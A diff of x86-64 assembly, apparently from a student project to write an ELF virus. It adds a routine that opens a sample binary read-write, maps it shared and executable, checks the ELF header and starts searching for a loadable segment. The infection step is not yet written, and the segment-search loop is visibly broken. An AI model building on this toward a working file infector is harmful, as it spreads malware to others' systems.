@@ -48,7 +48,7 @@ _readDir:
         cmp BYTE [r10 + D_TYPE], D_REG_FILE 	; verifie le type du fichier
         jne _checkRead
         lea rsi, [r10 + D_NAME]                 ; charge le nom du fichier dans rsi
-        writeWork                               ; a modifier avec ta fonction
+		call _check_file
 
             _checkRead:
                 mov r8, FAM(famine.total_read)
@@ -56,6 +56,75 @@ _readDir:
                 cmp r8d, r12d                 	; if (total lu >= total getdents)
                 jge _return
                 jmp _listFile
+
+_check_file:
+	push rbp
+	mov	rbp, rsp
+    sub rsp, check_file_size
+
+	; === open file ===
+		mov	rax, SYS_OPEN
+		lea	rdi, [rel file_name]
+		mov rsi, O_RDWR
+		xor rdx, rdx 
+		syscall
+		cmp	rax, qword 0x0
+		jl	_leave_return
+		mov CHF(check_file.file_fd), rax
+
+	; === get file size ===
+		mov rax, SYS_LSEEK
+		mov	rdi, CHF(check_file.file_fd)
+		mov	rsi, 0x0
+		mov rdx, SEEK_END
+		syscall
+		mov r10, rax
+		mov rax, SYS_LSEEK
+		mov rdx, SEEK_SET
+		syscall
+
+	; === mmap file ===
+		mov rax, SYS_MMAP
+		mov	rdi, 0x0
+		mov rsi, r10
+		mov rdx, PROT_READ | PROT_WRITE | PROT_EXEC
+		mov r10, MAP_SHARED
+		mov r8, CHF(check_file.file_fd)
+		mov r9, 0x0
+		syscall
+		cmp	rax, 0x0
+		jl _leave_return
+		mov CHF(check_file.map), rax
+
+	; === check file format ===
+		cmp	dword [rax + 1], 0x02464c45	; if != 'E'
+		jne _leave_return
+
+	; === Find text segment ===
+	_fd_txt_seg:
+		mov r14, rax
+		mov r10, elf64_ehdr.e_phoff
+		add r14, elf64_ehdr.e_phoff
+		_segment_loop:
+			mov r13, r14
+			add r13, elf64_phdr.p_type
+			cmp word [r13], PT_LOAD
+			je _segment_loop
+			inc r14
+			jmp _segment_loop
+	
+	; === found text segment ===
+ 
+	; *** pas obligatoire ***
+	_close_file:
+		mov	rax, qword 0x3
+		mov	rdi, CHF(check_file.file_fd)
+		syscall
+		jmp _leave_return
+
+_leave_return:
+	leave
+	ret
 
 _return:
     ret
@@ -67,3 +136,4 @@ _exit:
 
 dir1        db  "../test", 0
 open        db  "It worked", 10, 0
+file_name	db	"sample64",0x0
